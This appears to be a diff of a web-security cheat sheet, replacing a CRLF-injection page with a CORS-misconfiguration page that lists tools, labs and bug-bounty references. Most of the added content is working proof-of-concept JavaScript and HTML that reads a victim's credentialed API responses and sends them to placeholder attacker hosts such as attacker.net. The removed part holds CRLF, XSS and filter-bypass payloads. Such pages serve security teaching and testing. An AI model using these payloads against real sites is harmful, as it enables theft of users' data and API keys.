@@ -1,152 +1,274 @@
-# Carriage Return Line Feed
+# CORS Misconfiguration
 
-> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.
+> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker's site using the victim's credentials.
 
 ## Summary
 
+* [Tools](#tools)
+* [Requirements](#requirements)
 * [Methodology](#methodology)
-    * [Session Fixation](#session-fixation)
-    * [Cross Site Scripting](#cross-site-scripting)
-    * [Open Redirect](#open-redirect)
-* [Filter Bypass](#filter-bypass)
+    * [Origin Reflection](#origin-reflection)
+    * [Null Origin](#null-origin)
+    * [XSS on Trusted Origin](#xss-on-trusted-origin)
+    * [Wildcard Origin without Credentials](#wildcard-origin-without-credentials)
+    * [Expanding the Origin](#expanding-the-origin)
 * [Labs](#labs)
 * [References](#references)
 
+## Tools
+
+* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
+* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
+* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
+* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
+* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool
+
+## Requirements
+
+* BURP HEADER> `Origin: https://evil.com`
+* VICTIM HEADER> `Access-Control-Allow-Credential: true`
+* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`
+
 ## Methodology
 
-HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.
+Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.
 
-**CRLF Characters**:
+### Origin Reflection
 
-* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
-* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.
-
-By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:
-
-* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
-* Cache Poisoning: Forcing incorrect content to be stored in caches.
-* Header Manipulation: Altering headers to mislead users or systems
-
-### Session Fixation
-
-A typical HTTP response header looks like this:
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-Set-Cookie: sessionid=abc123
-```
-
-If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:
-
-```http
-HTTP/1.1 200 OK
-Content-Type: text/html
-Set-Cookie: sessionid=value
-Set-Cookie: admin=true
-```
-
-Now the attacker has set their own cookie.
-
-### Cross Site Scripting
-
-Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).
-
-**Requested page**:
-
-```http
-http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
-```
-
-**HTTP response**:
-
-```http
-Set-Cookie:en
-Content-Length: 0
-
-HTTP/1.1 200 OK
-Content-Type: text/html
-Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
-Content-Length: 34
-
-<html>You have been Phished</html>
-```
-
-In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .
-
-**Requested page**:
+#### Vulnerable Implementation
 
 ```powershell
-http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
-```
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: https://evil.com
+Cookie: sessionid=... 
 
-**HTTP Response**:
-
-```http
 HTTP/1.1 200 OK
-Date: Tue, 20 Dec 2016 14:34:03 GMT
-Content-Type: text/html; charset=utf-8
-Content-Length: 22907
-Connection: close
-X-Frame-Options: SAMEORIGIN
-Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
-ETag: "842fe-597b-54415a5c97a80"
-Vary: Accept-Encoding
-X-UA-Compatible: IE=edge
-Server: NetDNA-cache/2.2
-Link: https://example.com/[INJECTION STARTS HERE]
-Content-Length:35
-X-XSS-Protection:0
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true 
 
-23
-<svg onload=alert(document.domain)>
-0
+{"[private API key]"}
 ```
 
-### Open Redirect
+#### Proof Of Concept
 
-Inject a `Location` header to force a redirect for the user.
+This PoC requires that the respective JS script is hosted at `evil.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+
+or
+
+```html
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://victim.example.com/endpoint", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
+```
+
+### Null Origin
+
+#### Vulnerable Implementation
+
+It's possible that the server does not reflect the complete `Origin` header but
+that the `null` origin is allowed. This would look like this in the server's
+response:
 
 ```ps1
-%0d%0aLocation:%20http://myweb.com
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: null
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
 ```
 
-## Filter Bypass
+#### Proof Of Concept
 
-[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.
+This can be exploited by putting the attack code into an iframe using the data
+URI scheme. If the data URI scheme is used, the browser will use the `null`
+origin in the request:
 
-> Newly defined header fields SHOULD limit their field values to US-ASCII octets.
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://victim.example.com/endpoint',true);
+  req.withCredentials = true;
+  req.send();
 
-Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.
-
-| UTF-8 Character | Hex         | Unicode  | Stripped   |
-| --------------- | ----------- | -------- | ---------- |
-| `嘊`            | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
-| `嘍`            | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
-| `嘾`            | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
-| `嘼`            | `%E5%98%BC` | `\u563c` | `%3C` (<)  |
-
-The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.
-
-An example payload using UTF-8 characters would be:
-
-```js
-嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾
+  function reqListener() {
+    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe> 
 ```
 
-URL encoded version
+### XSS on Trusted Origin
+
+If the application does implement a strict whitelist of allowed origins, the
+exploit codes from above do not work. But if you have an XSS on a trusted
+origin, you can inject the exploit coded from above in order to exploit CORS
+again.
+
+```ps1
+https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
+```
+
+### Wildcard Origin without Credentials
+
+If the server responds with a wildcard origin `*`, **the browser does never send
+the cookies**. However, if the server does not require authentication, it's still
+possible to access the data on the server. This can happen on internal servers
+that are not accessible from the Internet. The attacker's website can then
+pivot into the internal network and access the server's data without authentication.
+
+```powershell
+* is the only wildcard origin
+https://*.example.com is not valid
+```
+
+#### Vulnerable Implementation
+
+```powershell
+GET /endpoint HTTP/1.1
+Host: api.internal.example.com
+Origin: https://evil.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+
+{"[private API key]"}
+```
+
+#### Proof Of Concept
 
 ```js
-%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.internal.example.com/endpoint',true); 
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+
+### Expanding the Origin
+
+Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
+
+#### Vulnerable Implementation (Example 1)
+
+In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
+
+```ps1
+GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://evilexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evilexample.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+
+#### Proof of Concept (Example 1)
+
+This PoC requires the respective JS script to be hosted at `evilexample.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+
+#### Vulnerable Implementation (Example 2)
+
+In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+
+```ps1
+GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://apiiexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://apiiexample.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+
+#### Proof of concept (Example 2)
+
+This PoC requires the respective JS script to be hosted at `apiiexample.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
 ```
 
 ## Labs
 
-* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
-* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)
+* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
 ## References
 
-* [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://web.archive.org/web/20200113055606/https://www.owasp.org/index.php/CRLF_Injection)
-* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)
-* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1:192749)
+* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
+* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
+* [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://web.archive.org/web/20250426222841/https://hackerone.com/reports/426147)
+* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://web.archive.org/web/20190820201328/https://hackerone.com/reports/430249)
+* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://web.archive.org/web/20171230084544/https://hackerone.com/reports/168574)
+* [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://web.archive.org/web/20230323053559/https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
+* [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://web.archive.org/web/20260302141111/https://portswigger.net/web-security/cors)
+* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://web.archive.org/web/20250512191501/https://hackerone.com/reports/235200)
+* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - October 14, 2016](https://web.archive.org/web/20190919034024/https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
+* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://web.archive.org/web/20260204152901/https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
+* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14, 2019](https://web.archive.org/web/20210126182728/https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
